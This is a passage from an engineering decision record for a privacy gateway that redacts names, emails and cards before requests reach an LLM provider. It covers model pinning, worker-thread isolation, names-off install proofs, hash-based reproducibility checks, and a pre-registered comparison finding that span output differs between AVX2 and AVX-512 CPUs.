place and right is kept; one in place and wrong is deleted first. A second
run reported all four "already present". `--from <base URL>` reads the
same paths from a mirror (the hashes do not change); `--dir` sets the
root. `models/` is in `.gitignore` and `.dockerignore`.

**The load-time check, as built.** With names on, start-up checks the list
(`checkNameList`, `NAME_LIST_MISMATCH`), then each model file in list
order (`checkModelFiles` in `loadNameModel`): nothing there or not a
regular file is `NAME_MODEL_FILE_MISSING`, a wrong size or hash
`NAME_MODEL_FILE_MISMATCH`; both carry the file's path from the pinned
list, which `safeErrorDetails` logs (`file`). `startNameDetection` passes
a `NameStartupError` from the loader on with its code; any other loader
error is still `NAME_MODEL_LOAD_FAILED` with nothing kept. Each check is
called directly with wrong input in its tests (missing, a directory,
other bytes of the same size, truncated, only the hash wrong, a changed
list). **Cost:** `checkModelFiles` over the real files took 242, 195, 186,
181 and 183 ms in five runs, files just written and probably in the
operating system's cache; a cold read was not measured. Mutation checks:
17, 16 caught; M2 (no size check before hashing) survives and is
equivalent: a file of another size also has another hash, so the size
check only refuses sooner.

**The names-off proof, which (a)'s option 1 rests on.** A clean copy of
the working tree (tracked and new files; no `node_modules`, `models/` or
`.env`), then `npm ci --omit=optional`: none of the 16 packages installed.
`npm run typecheck` and `npm run build` passed. The built gateway (`node
--disable-sigusr1 dist/src/main.js`, names unset) started; `GET /health`
answered 200 `{"status":"ok"}`; one request with a synthetic email and a
published test card through a fake provider answered 200, the provider
received `[EMAIL_1]` and `[CARD_1]` and neither value, and the reply came
back with both restored. 4 runs of 4; a first run, before the driver
printed diagnostics, got no `/health` answer within 10 s, cause unknown,
not repeated. With names on in that install: exit 1,
`NAME_MODEL_FILE_MISSING` (`config.json`). With names on in the full
install, model present: the list and file checks passed and it exited 1
with `NAME_MODEL_LOAD_FAILED` (the worker is 4b). **What this does not yet
show:** nothing in `src/` imports the two packages today, so the result
covers the install, the typecheck, the build and serving; that the worker's
dynamic import stays behind the switch is for 4b to show by running this
proof again, and the refusal when names are on and the runtime is absent is
not reached yet (the file check refuses first in a names-off install).

**Found: `--omit=optional` omits every optional package in the tree, not
only ours.** Every non-dev optional package in the lockfile is one of the
16, so the gateway loses nothing. But three dev-only platform binaries go
too: `@esbuild/win32-x64`, `@rolldown/binding-win32-x64-msvc` and
`lightningcss-win32-x64-msvc`. esbuild's postinstall then ran its own
`npm install` of its binary, a download outside the lockfile, after which
`tsx` worked; **Vitest does not start** ("Cannot find native binding",
rolldown); the typecheck and the build are unaffected. So the opt-out
gives a names-off install for **running** the gateway (with `--omit=dev`
too in production), not a development checkout that runs the tests; a
development install keeps the default `npm ci`, where the packages are
present and, with names off, never loaded. This narrows how the opt-out is
described; it does not change the claim option 1 was chosen for, that a
names-off gateway installs, starts and serves without the runtime.
**The production form, run too:** in the same copy, with `dist/` already
built, `npm ci --omit=optional --omit=dev` added 57 packages, 0
vulnerabilities, no `onnxruntime-node`, `vitest` or `typescript`; the
gateway served the same request 3 runs of 3 with names off, and with names
on exited 1 with `NAME_MODEL_FILE_MISSING`. The `--omit=optional` install
before it added 200 packages; the full install has 219 (203 before this
step, plus the 16), and the 16 plus the three dev binaries are the
difference.

**CI.** The `npm ci` step now sets `ONNXRUNTIME_NODE_INSTALL: skip`
(decided above), since the runtime is in the lockfile from this step on.
Still verified only in 6c.

### Step 4b: the worker, and the proof that the gateway's spans are 6a's (2026-10-07)

**The B code moved, to the move standard.** B's loading and running lived
only in `scripts/compare-names.ts` (`encodeWords` and the body of
`bertCandidate`: the tokenizer, the labels from `config.json` in id order,
the inference session with default options, the int64 feeds, `[CLS]` and
`[SEP]`, the 512-token windows with 64 tokens of context). It moved,
imports and paths only, to `loadBert` in `src/detection/names/bert.ts`,
with the runtime passed in (the script loads its copy from
`D:\pseudonym-6a`, the gateway the optional dependency). The script now
calls it, and `speedText` moved to `eval/names/latency.ts` so that both
time the same text. Proof: the script run again for A, B and F
(`D:\pseudonym-6a\runs\2026-10-07-move-bert`): on the first 1,998
messages, the span SHA-256s of A (`1828fdc0…`), B (`96a5c328…`) and F
(`c6079836…`) are identical to all five earlier runs.

**The worker.** `src/gateway/name-worker.ts`: `WorkerNameModel` starts a
`worker_threads` thread (`name-worker-entry.ts`, which loads the two
optional packages with `require` and B with `loadBert`, then calls
`serveNames`), waits for its "ready" (two minutes at most, then start-up
is refused), sends each call's texts with an id, and matches the answer to
the call. The thread answers one request at a time, each text in order,
and sends back spans only; a request it cannot answer is "failed", with
nothing of the error. The thread's own errors are never read (one from the
model may quote its input). A thread that exits is a crash: every call in
flight fails, the detector is told (`onCrash`), later calls fail at once.
`NameDetector` (queue, timeout, health, every fail-closed rule) is
unchanged and sits in front of it; the model's answer is still checked by
`modelSpans` in the gateway, since it crosses from the thread. The entry is
chosen beside the module: the built `.js` with no Node options, or, from
TypeScript source, the `.ts` with tsx's loader. With names on, `main.ts`
calls `startNameDetection(() => loadNameModel(dir), nameOptions(env))`:
the list is checked, then the files, then the thread starts; any failure
refuses start-up (`NAME_MODEL_LOAD_FAILED` for the thread).

**The proof: B+F through the gateway reproduces 6a exactly.**
`npm run eval:names` (`eval/names-run.ts`, `eval/names/gateway.ts`) starts
the model as `main.ts` does and sends each of the 1,998 messages 6a
measured (the first 1,998 of today's generated set: F's spans recomputed
on them hash to the 6a F hash, so they are the same texts) as its own
`POST /v1/chat/completions` to the real server, recording B's raw answer
and the names the server was given. `eval/names-baseline.json` holds the
6a values, written from the 6a records, never from a gateway run: the
dataset hash, **B's span SHA-256 `96a5c3289a275cf91c4743ade7b5ec2f46c92a1974b9b1c5e5f8e82e453ed472`
(the 6a run's `spanHash`)**, **the names' SHA-256
`ba1a6b82da7c951da9dda75862bdb7656db17f968294f80255b708be0570c7b3` (D0's,
in D0's format: `{start, end}` per span, recovered by recomputing it from
the saved 6a spans)**, 933 detections and every metric of ADR-035's B+F
row. Result, on every run (8 of 8: the four below, three more in the gates, the last on the final code of step 5, and one in Phase 6c after the run started printing its machine): **identical**, field by field: B's
spans, the names, R 501/612 (81.8%), main PERSON 145/153, precision
661/933, 5.85 per 1,000 words, every row and lookalike count. So the
published 81.8% describes the spans the gateway produces on this machine,
with the runtime from the project's own `node_modules`. The held-out
41 of 45 was not re-run (the set is spent for names); it rests, as
before, on the four frozen inputs and the two joins (D0), and the B code
it ran is now the moved code proven identical here.

**The comparison can fail: negative controls (2026-10-07, after step 5,
at the user's request).** Seven identical runs are evidence only if a run
that differs is caught. Two scratch copies of the tree at `496d523` (the
step 5 commit; `node_modules` and `models/` linked from the repo, nothing
in the repo changed), each first run **unperturbed**, then with **one
line** changed by hand, each change firing once per run:

| Copy | Change (one line)                                                        | Unperturbed run   | Perturbed run                                                                 |
| ---- | ------------------------------------------------------------------------ | ----------------- | ----------------------------------------------------------------------------- |
| N1   | `name-worker.ts`: the first span B returns in the run, its score + 1e-12 | identical, exit 0 | **exit 1, `DIFFERENT … spans.model`**; names and every metric still identical |
| N2   | `find.ts`: the first name span of the run, one character longer          | identical, exit 0 | **exit 1, `DIFFERENT … spans.names`**; B's spans and every metric identical   |

So each hash catches a change no metric shows: a score moved in its
twelfth decimal place (no threshold crossed, so the names are the same),
and one name one character longer (the same values counted as covered).
B's spans hashed to `b3fce2ea…` under N1 and the names to `45bd9ef9…`
under N2. The logic of the comparison itself is covered by mutations G1
to G5 (testing guide, step 4b).

**Seen while proving the move, not changed: re-running the comparison
today does not reproduce ADR-035's table.** The generated set has 204
more messages than in 6a (the `glued-literal` and `keyword-in-literal`
shapes, added after it). `scripts/compare-names.ts` scores "the generated
set", so a run today scores 2,202 messages, and the rule then chooses B at
0.95 / 0.1, not 0.9 / 0.6 (B+F R 495/612, 5.53 per 1,000 words; same
decision, too costly). The spans on the 6a messages are identical; only
the scored set grew. The gateway ships 0.9 / 0.6 (`MODEL_POINT`), as
decided. `npm run eval:names` pins the 1,998 messages and their hash, so
it measures what was published; the comparison script does not, and
re-running it no longer reproduces ADR-035 without being limited to them.

**Speed and memory, measured through the worker** (replaces the 325 MiB
note above for the gateway; the 6a figures stay as what 6a measured):
three runs of `npm run eval:names` back to back on an idle machine (no other
`node` process, Ollama with nothing loaded, 5.5 GB free), then the
comparison script's B once, in the same conditions. Windows 11 x64, i5-12450H,
12 logical CPUs, Node 22.23.3. The first run of the day (above) is left out:
it overlapped the test runs of this step.

| Measure                                             | Gateway, run 1 | Run 2     | Run 3     | Script's B, same session | 6a (ADR-035)           |
| --------------------------------------------------- | -------------- | --------- | --------- | ------------------------ | ---------------------- |
| ms per KiB, 256 KiB of text                         | 308.2          | 331.9     | 321.1     | 275.0 (B alone)          | 285.0 (B), 286.0 (B+F) |
| Added latency, 1 KiB (median of 5)                  | 141 ms         | 144 ms    | 148 ms    |                          | 138 ms (B)             |
| 4 KiB                                               | 1,076 ms       | 1,064 ms  | 1,158 ms  |                          | about 1.1 s            |
| 16 KiB                                              | 4,909 ms       | 4,917 ms  | 5,461 ms  |                          |                        |
| 64 KiB                                              | 20,441 ms      | 22,552 ms | 22,474 ms |                          |                        |
| Model start (files hashed, then the thread loads B) | 1,085 ms       | 1,319 ms  | 1,686 ms  | 943 ms (load only)       | 934 ms                 |
| Resident memory added once started                  | 286 MiB        | 285 MiB   | 287 MiB   |                          |                        |
| Peak added over the run (6a's measure)              | 367 MiB        | 366 MiB   | 369 MiB   | 331 MiB                  | 325 MiB                |
| Whole process at its peak                           | 467 MiB        | 478 MiB   | 467 MiB   |                          |                        |
| Longest event-loop delay while the messages ran     | 94 ms          | 129 ms    | 101 ms    | 126 ms                   | 161 ms                 |

- **Speed: about 310–330 ms per KiB through the gateway**, against the
  script's 275 in the same session. The 6a figure stays what ADR-035
  measured; the gateway's is the one to publish for the gateway. The
  difference is not attributed: it includes the thread's messages, F, the
  join and the answer's check, but one script run against three gateway
  runs cannot separate those from run-to-run spread (6a's own five runs of
  B ranged 285–524 ms per KiB). It changes nothing in ADR-035: B+F
  already failed the 60 ms limit.
- **Memory: about 367 MiB** at its peak by 6a's measure, against the 325 MiB
  ADR-035 recorded for B (and 331 MiB for the script today), and about
  286 MiB held while idle once started. **This replaces the 325 MiB note for
  the gateway.** It is the whole process's resident memory (the thread is
  in the process), so it includes the server and the second JavaScript
  heap a thread has. Well under ADR-035's 1.5 GiB limit.
- **The worker did not buy event-loop isolation.** The longest
  event-loop delay with the model in a thread (94–129 ms over the three
  runs; 71 ms in the final gate's run) is in the range the in-process
  script showed for B (126 ms today, 161 ms in 6a). The runtime already
  ran inference on its own threads, so moving it to a worker thread took
  nothing measurable off the loop; what remains there is the gateway's own
  work per request (parsing, detection, redaction). ADR-035 expected the
  opposite ("until inference moves to a worker thread"); that expectation
  is contradicted by this measurement, and a dated note there says so.
  **What the thread does buy:** module isolation (the runtime, the
  tokenizer and the model are loaded only inside the thread; nothing the
  server loads imports them, so names off never loads them, and a missing
  runtime is a refused start rather than a failed import in the server),
  and a clean boundary: one channel, one call at a time, behind which
  `NameDetector` keeps the queue, the timeout and every fail-closed rule,
  with the thread's exit seen as a crash. It does **not** contain a native
  crash: bug-log 68 shows a native abort in the thread ends the whole
  process. Not measured: whether a large request's tokenization (done in
  JavaScript before the first window runs) would have blocked the loop
  noticeably in-process; the evaluation's messages are small.

**Found: a run cannot be cut short** (bug-log 68). Stopping the thread
(`worker.terminate()`) while the runtime is inside an inference ends the
whole process (0xC0000409 on Windows, 5 of 5); on an idle thread it takes
about 35 ms. The runtime has no cancel for a native run in Node
(`RunOptions.terminate` is WebAssembly only). `terminate()` and `close()`
are documented as idle-only, and nothing in the gateway calls them.
A call that runs too long is not stopped (ADR-037, step 4b: the user
chose option 1, which holds while the body limit bounds call length).

**The names-off proof, run again on the shipped code** (the procedure in
the testing guide; a clean copy of the working tree in the session
scratchpad):

| Install                                    | Names off      | Names on                                                                      |
| ------------------------------------------ | -------------- | ----------------------------------------------------------------------------- |
| `npm ci --omit=optional` (200 packages)    | serves, 3 of 3 | model files present, runtime absent: exit 1, `NAME_MODEL_LOAD_FAILED`, 2 of 2 |
| `--omit=optional --omit=dev` (57, 0 vuln.) | serves, 3 of 3 | the same, 2 of 2                                                              |
| full `npm ci` (219 packages)               | serves, 1 of 1 | starts from the built `.js` thread and serves, 3 of 3                         |

"Serves": `/health` 200, one request with a synthetic email and the Visa
test card reaches the fake provider as `[EMAIL_1] [CARD_1]` and neither
value, and the reply comes back restored; with names on also a name, sent
as `[PERSON_1]` and restored. Typecheck and build pass in the
`--omit=optional` install. This reaches what 4a could not: with names on
and the runtime absent, the file check passes and the thread fails to
load the runtime, so the refusal is the runtime's. The first start after
each fresh install took 7.9–13.2 s to answer `/health`, every later one
0.7–1.7 s (bug-log 66). esbuild's install script again fetched its own
binary outside the lockfile in the `--omit=optional` install
(`node_modules/esbuild/lib/downloaded-@esbuild-win32-x64-esbuild.exe`,
11.7 MB), this time printing nothing.

### Where this ADR stands at the end of Phase 6b (2026-10-07)

Every part of it is built, on Windows x64. What each decision now is, and
how it is checked:

| Decision                                                     | Built as                                                                                     | Checked by                                                                                                              |
| ------------------------------------------------------------ | -------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| (a) the runtime: exact optional dependencies, native         | `onnxruntime-node` 1.30.0, `@huggingface/tokenizers` 0.2.0, loaded only in the worker thread | the lockfile's integrity hashes (`npm ci`); the names-off proof (step 4b: refused start when absent)                    |
| (b) the model: pinned download, SHA-256 at download and load | `npm run fetch:model`, `checkModelFiles` at start-up                                         | `name-model.test.ts`, `fetch-model.test.ts`; 17 mutations (step 4a)                                                     |
| the name list: pinned by hash                                | `NAME_LIST_SHA256`, checked at start-up                                                      | `join.test.ts`, `names.test.ts`                                                                                         |
| load failure or mismatch refuses start-up                    | `startNameDetection` → `NameStartupError`, exit 1                                            | unit tests per code; the proof's names-on runs                                                                          |
| timeout, full queue or crash → 503, never names off          | `NameDetector` (step 3), unchanged behind the worker                                         | `names.test.ts`, `name-worker.test.ts`, the names project on B itself                                                   |
| no restart after a crash                                     | a crashed worker stays crashed; health unhealthy                                             | the same                                                                                                                |
| a call past its timeout is not stopped (ADR-037)             | option 1, tied to the body limit                                                             | comments at the body limit and the timeout; bug-log 68                                                                  |
| the four frozen inputs and the two joins                     | pins above, the moved code (steps 2, 3, 4b), D0                                              | `npm run eval:names`: B's spans and the names identical to 6a's, every metric, 8 runs of 8 on Windows (needs the model) |

**What it still leaves open, for Phase 6c and later:**

1. **Linux, all of it.** The install size, and the postinstall download
   with and without `ONNXRUNTIME_NODE_INSTALL=skip` (the skip is still an
   assumption; its two checks and its fallback are above). Whether the
   native runtime on Linux reproduces the Windows spans: `npm run
eval:names` on a Linux runner answers it, and if the hashes differ the
   published figures describe Windows only (this ADR's caveat).
2. **CI with the model.** Neither `npm run test:names` nor `npm run
eval:names` runs in CI; both need the runtime and the 178.5 MB model
   (downloaded per run, or cached by its SHA-256 values, "(b)" above).
3. **Platforms without a build:** darwin/x64 has no binary in the package
   (step 4a); names on would refuse to start there. Not checked.
4. **The model's licence**: the two open points above stand.
5. **Docker** (Phase 8): the same install setting as CI, the model files
   in the image or mounted, and a health check that allows for a cold
   first start (bug-log 66).

### Pre-registered: what a Linux span comparison means (Phase 6c, 2026-10-07; written and committed before any Linux run)

The rule below is the user's, set before anything names-related has run
on Linux. It is committed before the first Linux run, as this ADR's
measurements have been, so that the result cannot shape the rule.

**The comparison.** `npm run eval:names` on Linux x64: Node 22.23.3
(`.nvmrc`), the runtime and tokenizer from the lockfile, the four model
files by their pinned SHA-256 values, the name list by its hash, and the
same 1,998 generated messages (their hash is part of the check). The run
records the machine (runner image or distribution, CPU) and
`ONNXRUNTIME_NODE_INSTALL`'s value at install.

**Definitions, fixed here (proposed with the rule, for the user's review
before the run):**

- **"Reproduces the Windows spans"** means `eval:names` on Linux reports
  identical for B's span SHA-256 (`96a5c328…`) **and** the names' SHA-256
  (`ba1a6b82…`), as well as the messages, the detections and every metric.
  Either hash differing is "does not reproduce", **even if every metric is
  identical**: the negative control N1 showed a score can move in its last
  bits without moving any metric, and that is still a different
  computation. Which fields differ is reported.
- **A machine is its operating system image and its CPU model**, both
  recorded: the runtime chooses its kernels by CPU (this ADR, option 5),
  so the same Linux on another CPU is another machine. **On each machine,
  the first run that completes is the one that counts.** It is not re-run
  in the hope of a match. If later runs on the same machine disagree with
  its first, that is reported too, as non-determinism there. The rule
  below applies to each machine's result separately, and the platform that
  becomes a frozen input is the machine.
- **A run that does not complete** (a crash, a timeout, a refused start)
  is not a result in either direction; it is reported, and its cause found
  before the next run.

**If the Linux runtime does not reproduce the Windows spans:**

- It is a result, not a bug. **Nothing is changed to force agreement**: not
  the code, the pins, the model, the list, the point or the baseline.
- **The published figures, 81.8% on the generated set (501 of 612), 41 of
  45 on the held-out set and 5.85 false positives per 1,000 words, describe
  Windows** (Windows 11 x64, `onnxruntime-node` 1.30.0 native CPU), and are
  relabelled to say so wherever they appear (README, user manual, ADR-035).
- **Both platforms' numbers are reported where both exist**: for the
  generated set, the Linux run's own metrics beside the Windows ones.
- **The platform becomes a sixth frozen input**, beside the runtime, the
  tokenizer, the model bytes, the gazetteer half and the operating point
  (0.9 / 0.6): the figures describe the platform they were measured on.
- **The held-out figure is not re-run on Linux.** It is spent; it stays
  the Windows figure.
- `eval:names` keeps the Windows baseline as it is; a Linux baseline, from
  that first completed Linux run and labelled as Linux, is added beside it,
  never in its place.

**If Linux does reproduce them**, this is said plainly, in this ADR, the
README and the user manual: the figures hold on both platforms tested
(Windows 11 x64 and the Linux machine recorded), with the run's details.

### Result, Linux machine 1 (L2): the spans are reproduced (2026-10-07, after the pre-registration was committed in 7862c1a and pushed)

**The Linux run reproduced the Windows spans exactly.** The first
completed `npm run eval:names` on this machine, so, by the rule above, the
result for it:

| Field                                    | Linux, machine 1                                                    | Windows (the baseline)         |
| ---------------------------------------- | ------------------------------------------------------------------- | ------------------------------ |
| B's span SHA-256                         | `96a5c3289a275cf91c4743ade7b5ec2f46c92a1974b9b1c5e5f8e82e453ed472`  | the same                       |
| Names SHA-256                            | `ba1a6b82da7c951da9dda75862bdb7656db17f968294f80255b708be0570c7b3`  | the same                       |
| Messages, detections, every metric       | identical (933; R 501/612; precision 661/933; 5.85 per 1,000 words) | the same                       |
| Speed (256 KiB) / 1 KiB / 64 KiB latency | 450.7 ms per KiB / 247 ms / 28.2 s                                  | 308–332 / 141–148 ms / 20–23 s |
| Peak memory (6a's measure) / model start | 443 MiB / 5.1 s (files hashed over a Windows bind mount)            | 366–369 MiB / 1.1–1.7 s        |

**The machine:** a Docker container, `node:22.23.3-bookworm` (image digest
`sha256:0e5f906573693feaa1e21057ebdcfdb5bd5021f050b2dc7c9deceb629c7da2a8`),
Debian GNU/Linux 12, Microsoft's WSL2 kernel 6.6.87 (fourth part 2; the
full string is dotted like an IP address, which this repo's hygiene test
rightly refuses), under
Docker Desktop 29.8.1 on the Windows machine itself: **the same CPU**
(12th Gen Intel Core i5-12450H) but **4 logical CPUs** (Docker's VM; the
Windows runs had 12), Node v22.23.3, npm 10.9.9 (11.11.0 on Windows). The
source was the committed tree at `4496241` (`git archive`); the model
files were the Windows ones, mounted read-only and checked by SHA-256 at
start-up. Install: `ONNXRUNTIME_NODE_INSTALL=skip npm ci`, 219 packages.

**So the figures hold on both platforms tested**: Windows 11 x64 and Linux
x64 (Debian 12), on the i5-12450H, with 12 and with 4 logical CPUs. This
machine held the CPU fixed, so OS and thread count did not change a single
span here; whether **another CPU** does is the next question, answered on
GitHub's runners (L1) under the rule below.

**4a's install assumption, verified on Linux (this ADR, "The skip is an
assumption").** Check 1: after `npm ci` with the skip, both files are in
the package (`bin/napi-v6/linux/x64/libonnxruntime.so.1`, 45,828,512
bytes; `onnxruntime_binding.node`, 389,488), no CUDA or TensorRT file
exists, and `onnxruntime-node` is 301,125,480 bytes on disk by `du -b`:
the registry's 301,068,136 plus 14 directory entries of 4,096 bytes, so the
install script fetched nothing. Check 2: `npm run test:names`, which
creates an inference session on B and runs it, passed 6 of 6. **The skip
leaves a working CPU runtime**; the fallback is not needed. Not measured
yet: the install without the skip (the NuGet download), which the names
workflow's `default` input measures on a runner.

### Result, the GitHub runners (L1): one CPU reproduces the spans, one does not (2026-10-07, Names workflow runs #1 and #2)

Two manual runs of the Names workflow on `ubuntu-24.04`, the same code
and the same runner image as far as the logs show (both on kernel
`6.17.0-1022-azure`), landed on two different CPUs. As reported by the user
from the runs' logs (I cannot read the run logs from here):

| Run               | CPU                                      | B's spans   | Names       | Detections | Names block (R)    | Precision          | FP per 1,000 words | Against the baseline |
| ----------------- | ---------------------------------------- | ----------- | ----------- | ---------- | ------------------ | ------------------ | ------------------ | -------------------- |
| baseline (8 runs) | Intel Core i5-12450H (Windows 11)        | `96a5c328…` | `ba1a6b82…` | 933        | 501 of 612 (81.8%) | 661 of 933 (70.8%) | 5.85               | (the baseline)       |
| L2                | Intel Core i5-12450H (Debian 12, 4 CPUs) | `96a5c328…` | `ba1a6b82…` | 933        | 501 of 612 (81.8%) | 661 of 933 (70.8%) | 5.85               | **identical**        |
| Names #1          | AMD EPYC 7763 64-Core (4 CPUs)           | `96a5c328…` | `ba1a6b82…` | 933        | 501 of 612 (81.8%) | 661 of 933 (70.8%) | 5.85               | **identical**        |
| Names #2          | Intel Xeon Platinum 8573C (4 CPUs)       | `d1f611f0…` | `46dd8ff3…` | 934        | 502 of 612 (82.0%) | 662 of 934 (70.8%) | 5.85               | **different**        |
| Names #3          | AMD EPYC 7763 64-Core (4 CPUs)           | `96a5c328…` | `ba1a6b82…` | 933        | 501 of 612 (81.8%) | 661 of 933 (70.8%) | 5.85               | **identical**        |
| Names #4          | Intel Xeon 6973P-C (4 CPUs)              | `d1f611f0…` | `46dd8ff3…` | 934        | 502 of 612 (82.0%) | 662 of 934 (70.8%) | as #2 (same names) | new CPU (= #2)       |

Run #2 in full: B's spans
`d1f611f06ea88b2feaa2bfdb5e8164bede8cafe8a905503e185b99f6f654bbfb`, names
`46dd8ff36336bbc80cf61571cb241d3074da08fd421686d7a18b0ee512f16777`;
`DIFFERENT from eval/names-baseline.json: spans.model, spans.names,
detections, metrics.precision, metrics.recall, metrics.rows` (which rows is
not printed); main cases 145 of 153; 147.0 ms per KiB (run #1: 292.1; the
i5-12450H on Windows: 308–332); peak 452 MiB; model start 868 ms; the model
from the cache (a hit), checked at start-up; both CPU-runtime files
present, `onnxruntime-node` 301,006,136 bytes; `test:names` 6 of 6.

**What the four machines establish.** The same code and inputs give
identical spans on three of them and slightly different spans on one:

- **The operating system does not change the spans.** On the i5-12450H,
  Windows 11 and Debian 12 agree (and 12 threads agree with 4). The OS
  caveat is now **closed by data, not argument**: runs #1 and #2 ran the
  same kernel (`6.17.0-1022-azure`) under the same runner label, so the
  same distribution and C library, and one matched the baseline while the
  other did not. The Ubuntu 24.04 container run on the i5-12450H that
  would have removed that last difference is **cancelled** (the user's
  decision): run #1 is a better control than it would have been, the same
  Linux as run #2 on a different CPU. (Not compared: the runner image build
  each job printed in its "Set up job" step; the identical kernel string
  suggests the same build.)
- **Not "a different CPU gives different spans".** Two CPUs across a
  vendor boundary, an Intel consumer part (i5-12450H) and an AMD server
  part (EPYC 7763), give identical spans; one CPU of the three, the Intel
  Xeon Platinum 8573C, differs.
- **The likely explanation, a hypothesis and stated as one:** the
  i5-12450H has no AVX-512, the EPYC 7763 (Zen 3) has none either, and the
  Xeon Platinum 8573C has AVX-512 and AMX. The two AVX2-class parts agree;
  the wider one differs. That fits all three data points and crosses a
  vendor boundary, and it is **consistent with the runtime selecting its
  compute kernels by instruction set**, different kernels rounding the
  quantised model's arithmetic differently. **It is not shown**: no run
  has looked at which kernels were chosen, three CPUs are three data
  points, and the Xeon's being about twice as fast as the EPYC on the same
  4 CPUs fits the hypothesis without proving it (clock speed and core
  design differ too).
- **The magnitude, so that "different" is not read as "unstable":** on the
  Xeon, one detection more in 933 (934), and that one is a correct name
  (502 against 501 names found; precision 70.8% in both); false positives
  and the main cases unchanged. B's raw-span hash differing means scores
  differ somewhere, as the negative control N1 showed a change of 1e-12
  would; how many spans differ is not known from the log. The runtime has
  been deterministic wherever it was run more than once: on the
  i5-12450H, 9 runs, the same spans every time. The Xeon and the EPYC have
  one run each so far.
- **The hypothesis, tested on a fourth machine (Names run #4, 2026-10-07).
  The prediction first, then its test; the order is the point.**
  - _The prediction:_ from the three CPUs above, the instruction-set
    hypothesis says a CPU with AVX-512 and AMX should give the Xeon
    Platinum 8573C's spans, not the baseline's. Run #4 landed on an
    **Intel Xeon 6973P-C**, an AVX-512 and AMX part, and the user predicted,
    **before `names-result.json` was opened**, that it would match the
    8573C rather than the baseline. **This prediction's provenance is
    weaker than the rest of this ADR's:** it was made in chat and not
    committed before the result was opened, unlike every pre-registration
    here. That was the user's omission, as the user records it. The
    standing step below makes the next one a committed pre-registration.
  - _The test:_ it matched the 8573C **byte for byte**: B's spans
    `d1f611f0…`, names `46dd8ff3…`, 934 detections, 502 of 612, precision
    662 of 934, main 145 of 153; its second pass identical to both. With no
    baseline for its model, its outcome was NEW CPU (exit 0).
  - **So the hypothesis has predicted a fourth machine out of sample, and
    held.** It is still **not shown**: no run has looked at which kernels
    the runtime selected, and agreeing with a prediction is evidence for
    the explanation, not a demonstration of it.
  - **Two stable groups, not per-CPU variation.** The two AVX2-class parts
    (i5-12450H, EPYC 7763) give one pair of hashes; the two AVX-512 and
    AMX parts (Xeon Platinum 8573C, Xeon 6973P-C) give the other, identical
    to each other across two CPU generations. Four CPUs, two answers. That
    is what the hypothesis predicts; it is also why C1 still keys by CPU
    model and not by group (above): the grouping is the hypothesis's, and a
    fifth CPU is checked against its own observed result, not against the
    group the theory assigns it.
  - **The CUDA libraries were on disk and changed nothing.** #4 used the
    `default` install, so the CUDA, TensorRT and shared provider libraries
    were installed (below), and its spans still equalled the 8573C's, a
    `skip`-equivalent run, exactly. The code-reading argument that only the
    runtime's built-in CPU provider runs (the session is created with an
    empty provider list) is now **measured**: providers on disk did not
    change one span.

**Which install the runs used.** Neither run's input is in what
`eval:names` prints (it shows the variable as its own process sees it,
unset in every run, because the workflow sets it only inside the install
step's shell). A `default` install on linux/x64 adds the CUDA, shared and
TensorRT provider libraries from NuGet to the package's `bin` folder
(`script/install-metadata.js` of the installed 1.30.0): run #2's
301,006,136 bytes is the package without them (within 0.02% of the
registry's 301,068,136). **Settled (the user, from run #1's install
step):** run #1 printed 4 logical CPUs, `onnxruntime-node` 301,068,136
bytes, and the same two files at the same sizes as run #2
(`libonnxruntime.so.1` 45,828,512, `onnxruntime_binding.node` 389,488),
and no CUDA or TensorRT file. The 62 KB between the two runs' directory
totals is `du`'s accounting, not a provider library (each library is far
larger). **Both runs are skip-equivalent, and both count** under the
stopping rule. **It could not have affected the spans either way:**
`loadBert` creates the session with no options, the runtime resolves an
empty provider list (`resolveBackendAndExecutionProviders` in
`onnxruntime-common`) and runs on its built-in CPU provider only, so CUDA
libraries on disk are never loaded.

**Measured (Names run #4, `default` input, 2026-10-07): a `default`
install on linux/x64 does fetch the CUDA libraries.** The claim above was
read from the package's metadata; #4 measured it true. `onnxruntime-node`
was **574,221,664 bytes** (by `du -sb`), against 301,068,136 with `skip`:
**273,153,528 bytes (about 273 MB) more**, including
`libonnxruntime_providers_cuda.so` 272,054,000,
`libonnxruntime_providers_tensorrt.so` 1,084,896 and
`libonnxruntime_providers_shared.so` 14,632. And with those libraries on
disk the spans were unchanged from a `skip`-equivalent run on the same
kind of CPU (the 8573C's, above), so "never loaded" is measured too.

**The comparison between runs #1 and #2 is controlled on everything but
the CPU model:** the same kernel, distribution, C library and runner
label, the same Node, the same install contents, and **the same 4 logical
CPUs**, which also rules out the thread count between the two runner jobs
(as the i5-12450H's 12 against 4 had on one CPU). One gave the baseline's
spans and the other did not.

**Applied as pre-registered** (nothing changed to make the hashes agree):

- **The published figures were measured on the Intel Core i5-12450H**
  (81.8% on the generated set, 41 of 45 held-out, 5.85 false positives per
  1,000 words), are reproduced exactly on Debian 12 on that CPU and on the
  AMD EPYC 7763, and differ slightly on the Intel Xeon Platinum 8573C. They
  are relabelled to say so in the README, the user manual and ADR-035.
- **The Xeon's figures are added beside them, never in their place.**
- **The CPU becomes a frozen input**, by its model: the figures describe
  the CPU models they were measured or reproduced on.
- **The held-out figure is not re-run on any other CPU.** It stays the
  i5-12450H figure.

**E1 is settled by data, not by the rule.** The same code on two runner
hosts gave one green run (#1, the EPYC) and one red run (#2, the Xeon). An
every-push check against the one baseline would have failed depending on
which runner it landed on, not on any change. That is what the proposed
per-CPU-model agreement (S2) and per-CPU-model baselines (C1) exist to
handle. Both runs count (above), so the stopping rule as first written
applied: two counted runs disagreed, E1 was not adopted, and the question
returned to the user, who confirmed S2 (the amendment below) and asked for
a daily schedule rather than a weekly one.

**C1 is keyed by CPU model, not by instruction set** (the user's
decision). The keying must not depend on a hypothesis drawn from three
CPUs: a baseline per CPU model asserts only what has been observed and
stays correct if the hypothesis turns out wrong, while a baseline per
instruction set would silently pass a CPU that has the same instruction
sets but chooses other kernels. **Do not "simplify" the keying to match
the theory**: the instruction-set explanation belongs here, as the likely
explanation, not in the code.

### Standing step: a new CPU's predicted group is committed before its result is opened (the user, 2026-10-07)

New CPU models keep appearing on GitHub's runners, and each is a chance
to test the instruction-set hypothesis out of sample. Run #4's test
depended on someone remembering to predict first, and the prediction was
not committed. From now on it is a standing step:

1. **The run keeps its results out of the log.** On a CPU model with no
   baseline, `eval:names` prints the machine line (OS, CPU model, Node) and
   nothing it measured: no hash, no count, no speed, no memory. Everything
   goes to `names-result.json` (`withholdResults` in
   `eval/names/gateway.ts`; shown on this machine by running it with its
   own model removed from the index: only the machine line and the
   instructions were printed).
2. **Before opening `names-result.json`**, write into this ADR, for that
